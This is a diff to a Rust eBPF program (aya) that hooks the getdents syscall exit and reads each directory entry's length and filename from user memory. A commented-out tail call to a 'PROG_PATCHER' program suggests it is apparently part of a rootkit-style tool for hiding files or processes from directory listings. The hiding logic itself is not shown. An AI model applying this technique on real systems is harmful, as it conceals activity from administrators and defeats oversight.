@@ -1,7 +1,7 @@
 #![no_std]
 #![no_main]
 
-use core::mem::offset_of;
+use core::mem::{offset_of, size_of, size_of_val};
 
 use aya_ebpf::{
     helpers::{
@@ -110,7 +110,7 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
         let buff_addr = *pbuff_addr;
         let pid = pid_tgid >> 32;
 
-        let d_reclen = 0;
+        let mut d_reclen = 0;
 
         let mut dirp: *const linux_dirent64 = core::ptr::null();
 
@@ -129,18 +129,34 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
                 break;
             }
             dirp = (buff_addr + bpos as u64) as *const linux_dirent64;
+
+            unsafe {
+                bpf_probe_read_user(
+                    &d_reclen as *const _ as *mut core::ffi::c_void,
+                    size_of_val(&d_reclen) as u32,
+                    &((*dirp).d_reclen) as *const _ as *const core::ffi::c_void,
+                );
+            }
+
+            unsafe {
+                bpf_probe_read_user(
+                    filename.as_mut_ptr() as *mut core::ffi::c_void,
+                    size_of_val(filename.as_ref()) as u32,
+                    (*dirp).d_name.as_ptr() as *const core::ffi::c_void,
+                );
+            }
         }
+        return Ok(0);
     } else {
         return Ok(0);
     }
 
-    info!(&ctx, "total_bytes_read is {}", total_bytes_read);
+    // info!(&ctx, "total_bytes_read is {}", total_bytes_read);
     // unsafe {
     //     if JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).is_err() {
     //         return Ok(0);
     //     };
     // }
-    Ok(0)
 }
 
 #[tracepoint]
